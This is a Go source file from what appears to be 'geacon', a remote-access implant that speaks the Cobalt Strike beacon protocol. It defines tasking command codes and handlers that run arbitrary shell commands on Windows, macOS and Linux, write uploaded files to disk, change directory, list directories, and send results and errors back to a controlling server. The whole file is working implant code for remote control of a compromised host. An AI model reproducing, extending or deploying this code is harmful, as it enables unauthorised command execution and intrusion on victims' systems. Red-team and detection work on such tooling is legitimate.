package packet

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"geacon/cmd/util"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

const (
	CMD_TYPE_SLEEP        = 4
	CMD_TYPE_SHELL        = 78
	CMD_TYPE_UPLOAD_START = 10
	CMD_TYPE_UPLOAD_LOOP  = 67
	CMD_TYPE_DOWNLOAD     = 11
	CMD_TYPE_EXIT         = 3
	CMD_TYPE_CD           = 5
	CMD_TYPE_PWD          = 39
	CMD_TYPE_FILE_BROWSE  = 53
)

func ParseCommandShell(b []byte) (string, []byte) {
	buf := bytes.NewBuffer(b)
	pathLenBytes := make([]byte, 4)
	_, err := buf.Read(pathLenBytes)
	if err != nil {
		panic(err)
	}
	pathLen := ReadInt(pathLenBytes)
	path := make([]byte, pathLen)
	_, err = buf.Read(path)
	if err != nil {
		panic(err)
	}

	cmdLenBytes := make([]byte, 4)
	_, err = buf.Read(cmdLenBytes)
	if err != nil {
		panic(err)
	}

	cmdLen := ReadInt(cmdLenBytes)
	cmd := make([]byte, cmdLen)
	buf.Read(cmd)

	envKey := strings.ReplaceAll(string(path), "%", "")
	app := os.Getenv(envKey)
	return app, cmd
}

func Shell(path string, args []byte) []byte {
	switch runtime.GOOS {
	case "windows":
		args = bytes.Trim(args, " ")
		argsArray := strings.Split(string(args), " ")
		cmd := exec.Command(path, argsArray...)
		out, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Sprintf("exec failed with %s\n", err)
		}
		return out
	case "darwin":
		path = "/bin/bash"
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	case "linux":
		path = "/bin/sh"
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	}
	args = bytes.Trim(args, " ")
	startPos := bytes.Index(args, []byte("-c"))
	args = args[startPos+3:]
	argsArray := []string{"-c", string(args)}
	cmd := exec.Command(path, argsArray...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Sprintf("exec failed with %s\n", err)
	}
	return out

}

func ParseCommandUpload(b []byte) ([]byte, []byte) {
	buf := bytes.NewBuffer(b)
	filePathLenBytes := make([]byte, 4)
	buf.Read(filePathLenBytes)
	filePathLen := ReadInt(filePathLenBytes)
	filePath := make([]byte, filePathLen)
	buf.Read(filePath)
	fileContent := buf.Bytes()
	return filePath, fileContent

}

func Upload(filePath string, fileContent []byte) int {
	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		//fmt.Printf("file create err : %v\n", err)
		return 0
	}
	defer fp.Close()
	offset, err := fp.Write(fileContent)
	if err != nil {
		//fmt.Printf("file write err : %v\n", err)
		return 0
	}
	//fmt.Printf("the offset is %d\n",offset)
	return offset
}
func ChangeCurrentDir(path []byte) {
	err := os.Chdir(string(path))
	if err != nil {
		//processError(err.Error())
		processErrorTest(err.Error())
	}
}
func GetCurrentDirectory() []byte {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		processErrorTest(err.Error())
		return nil
	}
	return []byte(result)
}

func File_Browse(b []byte) []byte {
	buf := bytes.NewBuffer(b)
	//resultStr := ""
	pendingRequest := make([]byte, 4)
	dirPathLenBytes := make([]byte, 4)

	_, err := buf.Read(pendingRequest)
	if err != nil {
		panic(err)
	}
	_, err = buf.Read(dirPathLenBytes)
	if err != nil {
		panic(err)
	}

	dirPathLen := binary.BigEndian.Uint32(dirPathLenBytes)
	dirPathBytes := make([]byte, dirPathLen)
	_, err = buf.Read(dirPathBytes)
	if err != nil {
		panic(err)
	}

	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	// build string for result
	/*
	   /Users/xxxx/Desktop/dev/deacon/*
	   D       0       25/07/2020 09:50:23     .
	   D       0       25/07/2020 09:50:23     ..
	   D       0       09/06/2020 00:55:03     cmd
	   D       0       20/06/2020 09:00:52     obj
	   D       0       18/06/2020 09:51:04     Util
	   D       0       09/06/2020 00:54:59     bin
	   D       0       18/06/2020 05:15:12     config
	   D       0       18/06/2020 13:48:07     crypt
	   D       0       18/06/2020 06:11:19     Sysinfo
	   D       0       18/06/2020 04:30:15     .vscode
	   D       0       19/06/2020 06:31:58     packet
	   F       272     20/06/2020 08:52:42     deacon.csproj
	   F       6106    26/07/2020 04:08:54     Program.cs
	*/
	fileInfo, err := os.Stat(dirPathStr)
	if err != nil {
		processErrorTest(err.Error())
		return nil
	}
	modTime := fileInfo.ModTime()
	currentDir := fileInfo.Name()

	absCurrentDir, err := filepath.Abs(currentDir)
	if err != nil {
		panic(err)
	}
	modTimeStr := modTime.Format("02/01/2006 15:04:05")
	resultStr := ""
	if dirPathStr == "./" {
		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
	} else {
		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
	}
	//resultStr := fmt.Sprintf("%s/*", absCurrentDir)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
	files, err := ioutil.ReadDir(dirPathStr)
	for _, file := range files {
		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")

		if file.IsDir() {
			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
		} else {
			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
		}
	}
	//fmt.Println(resultStr)

	return util.BytesCombine(pendingRequest, []byte(resultStr))

}

func processErrorTest(err string) {
	errIdBytes := WriteInt(0) // must be zero
	arg1Bytes := WriteInt(0)  // for debug
	arg2Bytes := WriteInt(0)
	errMsgBytes := []byte(err)
	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
	finalPaket := MakePacket(31, result)
	PushResult(finalPaket)
}
func Download() {

}
